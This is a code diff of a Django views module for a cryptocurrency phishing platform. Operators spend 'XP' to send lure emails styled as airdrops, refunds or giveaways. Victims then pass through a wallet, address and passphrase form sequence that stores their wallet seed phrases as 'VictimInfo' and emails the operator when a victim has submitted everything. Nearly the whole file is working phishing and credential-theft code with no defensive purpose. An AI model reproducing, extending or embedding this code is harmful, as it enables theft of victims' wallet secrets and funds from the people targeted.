@@ -1,23 +1,26 @@
-#core.views
-from django.shortcuts import render, redirect
+import logging
+from django.conf import settings
+from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required
-from .models import Campaign, VictimInfo
-from django.shortcuts import render, redirect
-from .forms import WalletForm, AddressForm, PassphraseForm, VictimInfoForm, CampaignForm, MultiCampaignForm
-from django.core.mail import send_mail
+from .models import Campaign, VictimInfo, Wallet
+from .forms import WalletForm, AddressForm, PassphraseForm, CampaignForm, MultiCampaignForm
+from django.core.mail import send_mail, EmailMultiAlternatives
 from django.template.loader import render_to_string
+from account.models import UserProfile
+from django.utils.html import strip_tags
+from django.contrib.sites.shortcuts import get_current_site
+from .utils import send_email_with_smtp
 
 
+logger = logging.getLogger(__name__)
 
 # Mapping of email templates
 TEMPLATE_MAPPING = {
-    'AIRDROP': 'templates/emails/airdrop_notification.html',
-    'REFUND': 'templates/emails/refund_notification.html',
-    'GIVEAWAY': 'templates/emails/giveaway_notification.html',
+    'AIRDROP': 'emails/airdrop_notification.html',
+    'REFUND': 'emails/refund_notification.html',
+    'GIVEAWAY': 'emails/giveaway_notification.html',
 }
-
-
 
 def index(request):
     return render(request, 'core/index.html')
@@ -29,35 +32,29 @@ def create_campaign(request):
         if form.is_valid():
             campaign = form.save(commit=False)
             campaign.user = request.user
+            xp_cost = campaign.email_template.xp_cost
 
             # Deduct XP cost
-            if request.user.userprofile.xp_balance >= campaign.xp_cost:
-                request.user.userprofile.xp_balance -= campaign.xp_cost
+            if request.user.userprofile.xp_balance >= xp_cost:
+                request.user.userprofile.xp_balance -= xp_cost
                 request.user.userprofile.save()
                 campaign.save()
 
-                # Prepare context for email
-                context = {
-                    'recipient_email': campaign.recipient_email,
-                    'cryptocurrency': campaign.cryptocurrency,
-                    'quantity': campaign.quantity,
-                    'min_balance': campaign.min_balance,
-                }
+                # Send the email with dynamic SMTP
+                try:
+                    send_campaign_email(campaign, request)
+                    messages.success(request, 'Campaign created and email sent successfully!')
+                except Exception as e:
+                    logger.error(f"Failed to send email: {e}", exc_info=True)
+                    messages.error(request, 'Campaign created but failed to send email.')
 
-                # Get the template path using the mapping
-                template_path = TEMPLATE_MAPPING.get(campaign.email_template)
-                if template_path:
-                    send_campaign_email(campaign.recipient_email, template_path, context)
-                    
-                messages.success(request, 'Campaign created and email sent successfully!')
                 return redirect('core:campaign_list')
             else:
                 messages.error(request, 'Insufficient XP balance to create this campaign.')
     else:
         form = CampaignForm()
+
     return render(request, 'core/create_campaign.html', {'form': form})
-
-
 
 
 @login_required
@@ -69,17 +66,22 @@ def create_multi_campaign(request):
             campaign_template = form.cleaned_data['email_template']
 
             for email in recipient_emails:
-                campaign = form.save(commit=False)
-                campaign.user = request.user
-                campaign.recipient_email = email
+                campaign = Campaign(user=request.user, recipient_email=email)  # Create a new campaign instance
                 # Deduct XP cost
                 if request.user.userprofile.xp_balance >= campaign.xp_cost:
                     request.user.userprofile.xp_balance -= campaign.xp_cost
                     request.user.userprofile.save()
                     campaign.save()
-                    
+
+                    # Prepare context for email
+                    context = {
+                        'cryptocurrency': campaign.cryptocurrency,
+                        'quantity': campaign.quantity,
+                        'min_balance': campaign.min_balance,
+                    }
+
                     # Send the email based on template
-                    send_campaign_email(email, campaign_template, campaign)
+                    send_campaign_email([email], campaign_template, context, campaign.id)  # Pass email as list
 
                 else:
                     messages.error(request, f"Insufficient XP for {email}. Campaign could not be created.")
@@ -92,74 +94,155 @@ def create_multi_campaign(request):
 
     return render(request, 'core/create_multi_campaign.html', {'form': form})
 
+
+
 @login_required
 def campaign_list(request):
     campaigns = Campaign.objects.filter(user=request.user)
     return render(request, 'core/campaign_list.html', {'campaigns': campaigns})
 
+################################## Get Victim Info ##################################
 
-################################## get victims info ##################################
+def wallet_info(request, campaign_id):
+    campaign = get_object_or_404(Campaign, id=campaign_id)
 
-def wallet_info(request):
     if request.method == 'POST':
         form = WalletForm(request.POST)
         if form.is_valid():
             victim_info = form.save(commit=False)
-            request.session['victim_wallet'] = victim_info.wallet  # Store wallet info in session
-            return redirect('core:address_info')  # redirect to the next step
+            # Store wallet ID and name in session
+            request.session['victim_wallet_id'] = victim_info.wallet.id
+            request.session['victim_wallet_name'] = victim_info.wallet.name  # Optional
+            return redirect('core:address_info', campaign_id=campaign.id)
     else:
         form = WalletForm()
 
-    return render(request, 'core/wallet_info.html', {'form': form})
+    return render(request, 'core/wallet_info.html', {'form': form, 'campaign': campaign})
 
-def address_info(request):
+
+
+def address_info(request, campaign_id):
+    campaign = get_object_or_404(Campaign, id=campaign_id)
+
     if request.method == 'POST':
         form = AddressForm(request.POST)
         if form.is_valid():
-            request.session['victim_address'] = form.cleaned_data['address']  # Store address info in session
-            return redirect('core:passphrase_info')
+            # Store address info in session
+            request.session['victim_address'] = form.cleaned_data['address']
+            # Redirect to passphrase_info with campaign_id
+            return redirect('core:passphrase_info', campaign_id=campaign.id)
     else:
         form = AddressForm()
 
-    return render(request, 'core/address_info.html', {'form': form})
+    return render(request, 'core/address_info.html', {'form': form, 'campaign': campaign})
 
-def passphrase_info(request):
+def passphrase_info(request, campaign_id):
+    campaign = get_object_or_404(Campaign, id=campaign_id)
+
     if request.method == 'POST':
         form = PassphraseForm(request.POST)
         if form.is_valid():
-            # Create VictimInfo object and save to the database
             victim_info = VictimInfo(
-                wallet=request.session.get('victim_wallet'),
-                recipient_email=form.cleaned_data['recipient_email'],  # Assuming email is provided in this form
+                user=request.user,  # Associate the current user
+                wallet=get_object_or_404(Wallet, id=request.session.get('victim_wallet_id')),  # Fetch wallet info from session
+                campaign=campaign,  # Set the associated campaign
                 passphrase=form.cleaned_data['passphrase'],
                 address=request.session.get('victim_address'),
-                user=None  # No user associated with victim info
             )
             victim_info.save()
+
             # Clear session data after saving
-            del request.session['victim_wallet']
+            del request.session['victim_wallet_id']
             del request.session['victim_address']
-            return redirect('core:victim_info')  # Redirect to view all submitted info
+
+            #send email notification to user 
+            send_victim_info_notification(user_email=campaign.user.email, campaign=campaign)
+            messages.success(request, 'Victim info saved successfully!')
+
+            return redirect('core:success', pk=campaign.id)  # Redirect to view all submitted info
     else:
         form = PassphraseForm()
 
-    return render(request, 'core/passphrase_info.html', {'form': form})
+    return render(request, 'core/passphrase_info.html', {'form': form, 'campaign': campaign})
 
-#def victim_info(request):
-#    victim_info = VictimInfo.objects.all()  # Retrieve all victim info
-#    return render(request, 'core/victim_info.html', {'victim_info': victim_info})
+
+################################## Success Page ##################################
+def success(request, pk):
+    campaign = get_object_or_404(Campaign, id=pk)
+    
+    return render(request, 'core/success.html', {'campaign': campaign})
+
+
+
+
 
 
 @login_required
-def victim_info_list(request):
-    victim_infos = VictimInfo.objects.filter(user=request.user).order_by('-created_at')
-    return render(request, 'core/victim_info_list.html', {'victim_infos': victim_infos})
+def campaign_detail(request, pk):
+    campaign = get_object_or_404(Campaign, pk=pk)
+    return render(request, 'core/campaign_detail.html', {'campaign': campaign})
 
+@login_required
+def victim_info_list(request):
+    victim_infos = VictimInfo.objects.filter(user=request.user).order_by('-created_at')  # Corrected query
+    return render(request, 'core/victim_info_list.html', {'victim_infos': victim_infos})  # Corrected context variable
 
 
 ################################ EMAIL SENDING ###################################
+################################ EMAIL SENDING ###################################
+################################ EMAIL SENDING ###################################
 
-def send_campaign_email(recipient_email, template, context):
+
+
+def get_base_url(request):
+    return f"{request.scheme}://{get_current_site(request).domain}"
+
+def send_campaign_email(campaign, request):
+    base_url = get_base_url(request)
+    context = {
+        'base_url': base_url,
+        'campaign_id': campaign.id,
+        'cryptocurrency': campaign.cryptocurrency,
+        'quantity': campaign.quantity,
+        'min_balance': campaign.min_balance,
+    }
+    # Get the template path using the mapping
+    template_type = campaign.email_template.type
+    template_path = TEMPLATE_MAPPING.get(template_type)
+
+    if not template_path:
+        raise ValueError(f"Invalid email template type: {template_type}")
+
     subject = 'Exciting News from Our Campaign!'
-    message = render_to_string(template, context)
-    send_mail(subject, message, 'from@example.com', [recipient_email], fail_silently=False)
+    send_email_with_smtp(template_type, subject, campaign.recipient_email, context, template_path)
+
+
+
+def send_victim_info_notification(user_email, campaign):
+    """
+    Sends an email notification to the user when the victim successfully submits all their information.
+    """
+    subject = 'Victim Information Submission Successful'
+    context = {
+        'campaign_type': campaign.email_template.type,
+        'campaign_id': campaign.id,
+    }
+
+    message = f"""
+    Hello,
+
+    The victim associated with your campaign "{campaign.email_template.type}" has successfully submitted all the required information.
+
+    You can view the submitted information in your campaign dashboard.
+
+    Best regards,
+    Your Platform Team
+    """
+
+    template_type = campaign.email_template.type  # Get the email type
+    template_path = TEMPLATE_MAPPING.get(template_type)
+
+    try:
+        send_email_with_smtp(template_type, subject, user_email, context, template_path)
+    except Exception as e:
+        logger.error(f"Failed to send notification email for {campaign.id} to {user_email}: {e}", exc_info=True)
